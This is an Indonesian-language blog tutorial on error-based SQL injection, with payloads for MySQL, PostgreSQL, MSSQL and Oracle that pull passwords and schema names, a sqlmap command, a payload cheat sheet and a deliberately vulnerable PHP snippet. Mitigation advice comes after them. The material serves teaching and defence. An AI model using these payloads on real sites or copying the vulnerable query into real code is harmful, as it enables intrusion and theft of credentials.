---
title: "SQL Injection — Error Based"
date: 2026-04-03T01:00:01+07:00
draft: false
author: "Andrew"
summary: "Error-Based SQL Injection adalah teknik di mana attacker memanfaatkan pesan error database untuk mengekstrak informasi dari database."
tags: ["Web Penetration Testing", "SQL Injection", "Error Based"]
categories: ["Web Penetration Testing", "SQL Injection"]
description: ""
---

# SQL Injection — Error Based

## Apa Itu Error-Based SQLi?

Di antara semua jenis SQL injection, **Error-Based SQLi** adalah yang paling "verbose", aplikasi dengan sukarela membocorkan informasi melalui pesan error database. Attacker tidak perlu menebak-nebak atau menunggu response time; mereka tinggal memicu error, dan database akan menampilkan data yang seharusnya tersembunyi.

Ini seperti bertanya kepada seseorang yang terlalu banyak bicara: bukan hanya menjawab pertanyaanmu, tapi juga memberikan konteks yang tidak diminta, dan informasi yang mungkin tidak boleh diketahui.

---

## Cara Kerjanya

**Konsep Dasar:**

Attacker menyisipkan payload yang sengaja memicu errordatabase, tetapi payload tersebut dikonstruksi sehingga error mengandung data yang attacker ingin ekstrak. Database, dalam kebiasaannya menampilkan error message lengkap, membocorkan informasi tersebut.

**Contoh sederhana:**

```
Normal: GET /product?id=1 → Returns product data

Malicious: GET /product?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--
```

**Error message yang dikembalikan:**

```
XPATH - MySQL Error: 1105 - XPATH syntax error: '~adminpassword123'
```

Password `adminpassword123` terbuka dalam error message!

---

## Teknik Populer

### 1. MySQL — EXTRACTVALUE / UPDATEXML

```sql
-- EXTRACTVALUE (MySQL 5.1+)
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))

-- UPDATEXML (alternative)
AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)
```

### 2. PostgreSQL — cast() atau :: casting

```sql
AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
```

### 3. MSSQL — convert() atau cast()

```sql
AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users))
```

### 4. Oracle — utl_inaddr.get_host_name

```sql
AND 1=utl_inaddr.get_host_name((SELECT password FROM users))
```

---

## Diagram Serangan

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACKER                                                   │
│  Payload: EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password    │
│           FROM users WHERE username='admin')))              │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  WEB APPLICATION                                           │
│  Query: SELECT * FROM products WHERE id =                 │
│         EXTRACTVALUE(1, CONCAT(0x7e,                       │
│              (SELECT password FROM users...)))             │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  MySQL ERROR LOG:                                          │
│  "XPATH syntax error: '~adminpassword123'"                  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  ATTACKER RECEIVES:                                         │
│  "The password of admin user is: adminpassword123"         │
└─────────────────────────────────────────────────────────────┘
```

---

## Contoh Vulnerable Code

**PHP — Error reporting enabled:**

```php
<?php
// Production server dengan error reporting ON (BAD!)
error_reporting(E_ALL);
ini_set('display_errors', 1);

$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";

try {
    $result = mysqli_query($conn, $query);
} catch (Exception $e) {
    // Error disclosure — menampilkan detail error ke user
    echo "Database Error: " . $e->getMessage();
}
?>
```

**Attacker mendapatkan:**

```
GET /product?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))

Output:
Database Error: XPATH syntax error: '~admin_hashed_password'
```

---

## Mitigasi

```php
<?php
// PRODUCTION: Matikan error display
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);  // Log ke file, bukan screen

// Gunakan prepared statements
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

**Prinsip umum:**
```
✅ Matikan error display di production
✅ Gunakan prepared statements
✅ Error logging ke file, bukan ke user output
✅ custom error pages untuk menyembunyikan detail teknis
```

---

## Deteksi Manual

```bash
# Dengan sqlmap
sqlmap -u "https://example.com/product?id=1" --technique=E --batch

# Manual trigger error
' " ) ) --
AND EXTRACTVALUE(1, CONCAT(0x7e, database()))--
AND UPDATEXML(1, CONCAT(0x7e, version()), 1)--
```

---

## Cheat Sheet

| Database | Extract Data Payload |
|----------|---------------------|
| MySQL 5.1+ | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users)))` |
| MySQL 5.1+ | `UPDATEXML(1, CONCAT(0x7e, version()), 1)` |
| PostgreSQL | `CAST((SELECT password FROM users LIMIT 1) AS INT)` |
| MSSQL | `CONVERT(INT, (SELECT TOP 1 password FROM users))` |

| Get Info | Payload |
|----------|---------|
| Database name | `EXTRACTVALUE(1, CONCAT(0x7e, database()))` |
| User version | `EXTRACTVALUE(1, CONCAT(0x7e, version()))` |
| Table names | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables)))` |
| Column names | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns)))` |

---

## Referensi

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Error-Based Injection Explained](https://resources.infosecacademy.com/error-based-sql-injection/)
